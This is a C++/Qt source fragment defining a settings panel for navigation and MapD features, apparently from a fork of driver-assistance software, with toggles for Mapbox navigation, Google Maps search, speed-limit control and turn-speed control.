void DPMapsPanel::dpMapBox(QVBoxLayout * layout) {
  QWidget *mapbox = new QWidget;
  QVBoxLayout *mapboxLayout = new QVBoxLayout;
  mapboxLayout->setContentsMargins(QMargins());
  qrWidget = new NavQRWidget;
  connect(this, &DPMapsPanel::updateIpAddr, qrWidget, &NavQRWidget::updateIpAddr);
  mapboxLayout->addWidget(qrWidget);
  mapboxLayout->addWidget(horizontal_line());
  mapboxLayout->addWidget(new ParamControl("dp_nav_full_screen", DPMapsPanel::tr("Show Full Screen Nav."), DPMapsPanel::tr("This will show navigation in full screen.\nPlease tap green boarder if you wish to switch back drive view."), ICON_EMPTY));
  mapboxLayout->addWidget(horizontal_line());
  mapboxLayout->addWidget(new ParamControl("dp_nav_gmap_enable", DPMapsPanel::tr("Search Destination using Google Map"), DPMapsPanel::tr("This will allow you to search destination in google map api.\nYou will need to apply your own google map api key.\bEnter your key detail in web interface once it's enabled."), ICON_EMPTY));
  mapboxLayout->addWidget(horizontal_line());
  mapbox->setLayout(mapboxLayout);

  ParamControl *mapboxParamCtrl = new ParamControl("dp_otisserv", DPMapsPanel::tr("Enable Nav."), DPMapsPanel::tr("This will let use the build in Navigation.\nUse web interface to control it: *http://<device_ip>:8082*.\nYou will need to apply your own mapbox token at https://www.mapbox.com/.\nInternet access from mobile phone (tethering) is required.\nReboot required."), "");
  QObject::connect(mapboxParamCtrl, &ToggleControl::toggleFlipped, [=](bool state) {
    if (state) {
      mapbox->show();
    } else {
      mapbox->hide();
    }
  });
  layout->addWidget(mapboxParamCtrl);
  layout->addWidget(mapbox);

  if (!Params().getBool("dp_otisserv"))
    mapbox->hide();
}

// Mapd
void DPMapsPanel::dpMapd(QVBoxLayout * layout) {

  QWidget *mapdCtrl = new QWidget;
  QVBoxLayout *mapdCtrlLayout = new QVBoxLayout;
  mapdCtrlLayout->setContentsMargins(QMargins());
  mapdCtrlLayout->addWidget(horizontal_line());
  mapdCtrlLayout->addWidget(new ParamControl("TurnVisionControl",
                                      DPMapsPanel::tr("Enable vision based turn control"),
                                      DPMapsPanel::tr("Use vision path predictions to estimate the appropiate speed to drive through turns ahead."),
                                      ICON_EMPTY));
  mapdCtrlLayout->addWidget(horizontal_line());
  mapdCtrlLayout->addWidget(new ParamControl("SpeedLimitControl",
                                      DPMapsPanel::tr("Enable Speed Limit Control"),
                                      DPMapsPanel::tr("Use speed limit signs information from map data and car interface to automatically adapt cruise speed to road limits."),
                                      ICON_EMPTY));
  mapdCtrlLayout->addWidget(horizontal_line());
  mapdCtrlLayout->addWidget(new ParamControl("SpeedLimitPercOffset",
                                      DPMapsPanel::tr("Enable Speed Limit Offset"),
                                      DPMapsPanel::tr("Set speed limit slightly higher than actual speed limit for a more natural drive."),
                                      ICON_EMPTY));
  mapdCtrlLayout->addWidget(horizontal_line());
  mapdCtrlLayout->addWidget(new ParamControl("TurnSpeedControl",
                                      DPMapsPanel::tr("Enable Map Data Turn Control"),
                                      DPMapsPanel::tr("Use curvature info from map data to define speed limits to take turns ahead"),
                                      ICON_EMPTY));
  mapdCtrlLayout->addWidget(horizontal_line());
  mapdCtrlLayout->addWidget(new ParamControl("ShowDebugUI",
                                      DPMapsPanel::tr("Show debug UI elements"),
                                      DPMapsPanel::tr("Show UI elements that aid debugging."),
                                      ICON_EMPTY));
  mapdCtrlLayout->addWidget(horizontal_line());
  mapdCtrl->setLayout(mapdCtrlLayout);

  ParamControl *mapdParamCtrl = new ParamControl("dp_mapd", DPMapsPanel::tr("Enable MapD"), DPMapsPanel::tr("Use OSM to assist lateral/longitudinal control.\nPlease note:\n 1. This feature will works only when your car support OP longitudinal.\n2. MapD will contribute your route to OSM for future improvement automatically.\n3. You can add your own offset for mapd just follow the readme under /selfdrive/mapd/."), "");
  QObject::connect(mapdParamCtrl, &ToggleControl::toggleFlipped, [=](bool state) {
    if (state) {
      mapdCtrl->show();
    } else {
      mapdCtrl->hide();
    }
  });
  layout->addWidget(mapdParamCtrl);
  layout->addWidget(mapdCtrl);

  if (!Params().getBool("dp_mapd"))
    mapdCtrl->hide();
}

DPMapsPanel::DPMapsPanel(QWidget* parent) : QWidget(parent) {
  QVBoxLayout *layout = new QVBoxLayout(this);

  dpMapBox(layout);
  dpMapd(layout);
}
